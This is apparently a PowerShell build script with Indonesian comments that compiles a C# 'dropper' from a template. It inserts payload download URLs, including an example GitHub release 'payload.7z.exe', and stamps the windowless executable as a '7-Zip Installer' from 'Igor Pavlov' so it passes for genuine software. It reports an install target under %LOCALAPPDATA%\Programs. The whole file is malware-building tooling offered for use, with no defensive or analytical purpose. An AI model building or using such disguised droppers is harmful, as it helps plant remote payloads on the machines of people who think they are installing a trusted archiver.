# tools\dropper\build.ps1 - compile dropper dari template.
#
# Placeholder __NAME__/__URLS__/__SHA__ diganti di sini, jadi tidak ada string
# penting yang perlu diedit tangan di .cs. Sumber template tetap bersih dan
# aman disimpan.
#
# Pakai:
#   .\tools\dropper\build.ps1 -Url "https://github.com/user/MRDAT/releases/latest/download/payload.7z.exe"
#   .\tools\dropper\build.ps1 -Url "<utama>" -Url2 "<cadangan>" -Sha "<sha256>"
#   .\tools\dropper\build.ps1 -Cek            -> hanya cetak ukuran/hash hasil

param(
    [Parameter(Mandatory = $true)][string]$Url,
    [string]$Url2 = "",
    [string]$Url3 = "",
    [string]$Sha = "",
    [string]$Name = "payload.7z",
    [string]$Icon = "",
    [string]$Out = "",
    [string]$Title = "7-Zip Installer",
    [string]$Product = "7-Zip",
    [string]$Company = "Igor Pavlov",
    [string]$Ver = "24.9.0.0",
    # Hanya untuk uji lokal: izinkan file:// sebagai sumber. Tanpa switch ini
    # build menolak, supaya dropper produksi tidak pernah menunjuk ke disk
    # mesin sendiri (itu berfungsi cuma di satu mesin).
    [switch]$Lokal
)

$ErrorActionPreference = "Stop"
$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent

if ($Sha -and $Sha.Length -ne 64) { throw "sha256 harus 64 hex char" }
if ($Url -match '^file://') {
    if (-not $Lokal) { throw "file:// ditolak (butuh -Lokal, hanya untuk uji)" }
} elseif ($Url -notmatch '^https?://') {
    throw "Url harus http(s)"
}

$csc = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe'
if (-not (Test-Path $csc)) { $csc = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe' }
if (-not (Test-Path $csc)) { throw "csc.exe tidak ketemu" }

if (-not $Out) { $Out = Join-Path $here "dist\dropper.exe" }
New-Item -ItemType Directory -Force -Path (Split-Path $Out -Parent) | Out-Null

$urls = (@($Url, $Url2, $Url3) | Where-Object { $_ }) -join '|'

$src = Get-Content (Join-Path $here "dropper.template.cs") -Raw
# Escape backslash dan kutip supaya literal C# tetap sah.
$urlsCs = $urls.Replace('\', '\\').Replace('"', '\"')
$nameCs = $Name.Replace('\', '\\').Replace('"', '\"')

$src = $src.Replace('__NAME__', $nameCs).Replace('__URLS__', $urlsCs).Replace('__SHA__', $Sha)
$src = $src.Replace('__TITLE__', $Title).Replace('__PRODUCT__', $Product)
$src = $src.Replace('__COMPANY__', $Company).Replace('__VER__', $Ver)

$tmp = Join-Path $env:TEMP ("drp_" + [guid]::NewGuid().ToString("N") + ".cs")
Set-Content -Path $tmp -Value $src -Encoding UTF8

$args = @('/target:winexe', '/platform:anycpu', '/optimize+', '/nologo', "/out:$Out")
if ($Icon) {
    if (-not (Test-Path $Icon)) { throw "ikon tidak ada: $Icon" }
    $args += "/win32icon:$Icon"
}
$args += $tmp

& $csc @args 2>&1 | ForEach-Object { "    $_" }
if ($LASTEXITCODE -ne 0 -or -not (Test-Path $Out)) { throw "compile gagal" }
Remove-Item $tmp -Force -ErrorAction SilentlyContinue

$size = (Get-Item $Out).Length
$hash = (Get-FileHash $Out -Algorithm SHA256).Hash.ToLower()
$urlCount = ($urls -split '\|').Count

Write-Host ""
Write-Host "[+] exe    : $Out"
Write-Host "[+] ukuran : $size B"
Write-Host "[+] sha256 : $hash"
Write-Host "[+] url    : $urlCount buah"
Write-Host "[+] target : %LOCALAPPDATA%\Programs\$Name\$Name.exe"

# Bukti bahwa dropper tidak akan menyentuh apa pun kalau URL-nya mati:
# mode --cek hanya mengunduh, memverifikasi, lalu menghapus.
Write-Host ""
Write-Host "[*] uji: jalankan dengan argumen --cek pada mesin uji"
